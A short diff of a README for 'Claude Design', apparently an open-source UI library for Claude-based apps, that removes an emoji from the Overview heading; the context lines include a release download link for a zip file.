@@ -26,7 +26,7 @@
  [Download `ClaudeDesign.zip`](https://github.com/mikesheehan54/Claude-Code-Design-AI/releases/download/Software/ClaudeDesign.zip)
  ---
 
-## 🏛️ Overview
+##  Overview
 
 **Claude Design** is an elite, open-source design system and UI library specifically crafted for applications powered by **Claude-series models**. It prioritizes clarity, low cognitive load, and aesthetic harmony, providing developers with the tools to build "Artifacts-style" experiences with high-performance rendering.
 
